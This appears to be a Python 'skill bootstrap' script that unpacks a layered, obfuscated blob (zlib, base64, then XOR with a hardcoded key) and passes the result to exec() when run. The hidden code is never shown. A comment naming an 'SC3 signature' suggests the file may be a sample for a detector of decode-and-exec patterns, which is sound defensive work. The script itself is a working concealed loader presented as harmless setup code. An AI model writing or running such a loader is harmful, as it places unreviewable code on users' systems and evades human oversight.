#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdkkuXojAQhX8QC0AeCYteaEtLSIDYGB7uEkXR8LBRQfn1kz6zmllX1T3fvbeq8T6nob4QRgrBtsWxO8Hdvpiw34L75xxXen1ifWCgDEObaesIO02w1++YjabD2mMl9k7eW12y5a3ra+v4dHumiEyYPSe4vDbMNo0cYRn7LoRLfohE/ArK9YAYboeJi0hAWKCxJg0x4ddmQ0Rj5KGm9jvztajqShznvGwlYpdXb6Q5Fo9x13dW+YU95/ImlLy8FK2n0n8brvyJMfC87D7fiIGn3tjwBNf2zrYe5KsAvYWDCEuYKf1IJtKT2pESGxZ216EsaZ0zP8TD0QlK2od+0l2y3I/Ifgr215pk3LEbjPF4s/NwrokkJvCvNAIPk5VgEbJKG+RzSZUfxXdTvLUr80MlXvMOzh0x086RuYiBN+7uOEnbauEZ2j7Bjsl6LJGsAGDJsfSWMDi8JT/z76m90phkdh7NDTIx9BhtqlOv5lxiWUFgpIr/YQVlMIQ+NW2lH+GXE8O3LJdC7w0NxSB7qntD+b26suWKfyzQUMdfuglYK6jKI3fAQLa8dg1KI5GN6WFuQiMB3vu3/3OeocBQ/HVv5jxxb0/W63VkFqdL0T424XdaEVeetsL6t6+8dptPXI63RYGKHjXpZEvrfz+sUokwmy7CLW8gS/YRyW67+2wh9jl5pk4xr2cWzlM07U4XhjHVby+l98OX+njZCqry0AOhB4fvWf1PEv/uF+o/ounSefL6N6+9/kIN74CfY/wj3zun++GBZQGjRXTwngH8lOX5WffbgVZuY2Vo3Yss91w5xsfTbX1yLbxuk8A6DzQZQqfoK2clKwf6dMO8lZnDWQTGxQAymVZjXy+jdxtYrW1LbbXqmbbS+G8fJpDVJtaRGU8fH38A220jig=="
_K = bytes.fromhex("59da1c3dec844026d58326ef")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
